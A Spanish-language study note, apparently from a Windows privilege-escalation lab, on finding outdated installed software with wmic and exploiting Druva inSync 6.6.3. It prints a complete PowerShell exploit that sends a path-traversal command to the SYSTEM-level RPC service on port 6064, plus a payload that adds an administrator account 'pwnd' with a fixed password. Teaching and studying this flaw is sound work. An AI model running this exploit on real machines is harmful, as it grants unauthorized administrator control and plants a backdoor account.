---
layout: apunte
title: "6. Abusing Vulnerable Software"
---

<h2>Unpatched Software</h2>
El software instalado en el sistema objetivo, puede presentar varios tipos de oportunidades de escalada de privilegios. Con los drivers, puede que los usuarios y organizaciones no los actualicen tan recurrentemente como el sistema operativo. Puedes usar la herramienta `wmic` para listar el software instalado en el sistema objetivo y sus versiones. El comando de abajo dumpeará información que recolecte del software instalado.

`wmic product get name,version,vendor`

>[!CAUTION] Puede que `wmic product` no liste todos los programas instalados. Dependiendo de su método de instalación algunos pueden no aparecer.

Una vez recopilada la información, siempre podemos buscar exploits existentes en el software instalado en sitios como [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) o Google entre otros.

-------------------------------------------
<h2>Caso de Estudio: Druva inSync 6.6.3</h2>
 El servidor objetivo corre Druva inSync 6.6.3, que es vulnerable a la escalada de privilegios reportada por [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). La vulnerabilidad resulta de un parche mal aplicado sobre otra vulnerabilidad reportada para la versión 6.5.0 por [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).

El software es vulnerable porque corre un servidor RPC (Remote Procedure Call) en el puerto 6064 con privilegios SYSTEM, accesible solo desde localhost.

>[!NOTE] RPC es un mecanismo que permite a un proceso dado exponer funciones (llamados procedimientos) a la red para que otras máquinas puedan llamarlas remotamente.

En el caso de Druva, uno de estos procedimientos (el número 5), en el puerto 6064 permite a cualquiera pedir la ejecución de cualquier comando. Como corre con privilegios SYSTEM, dicho comando se ejecuta con esos privilegios.

La vulnerabilidad original (en la 6.5.0) permitía ejecutar cualquier comando sin restricciones. La idea de esto era permitir ejecutar ciertos binarios de forma remota, más que permitir la ejecución de cualquier comando.

Salió un parche donde decidieron que la mejor manera de solventarlo era comprobar que el comando comenzaba con `C:\ProgramData\Druva\inSync4\`, donde se suponía que estaban los binarios autorizados. Para sobrepasar este control pobre, vale con realizar un Path Traversal: `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`.

Para entenderlo del todo, necesitamos saber cómo hablar con el puerto 6064. Por suerte el protocolo usado es sencillo.

!**Pasted image 20251201183806.png**

Publicado por Matteo Malvica [aquí](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), el siguiente exploit puede usarse en la máquina objetivo para elevar privilegios.

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```


>[!IMPORTANT] Cambia la variable `cmd` por lo que quieras ejecutar.

Para esta tarea cambiaremos el comando para usar: `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`

Esto creará un usuario `pwnd` con la contraseña `SimplePass123` y lo añadirá al grupo de administradores.
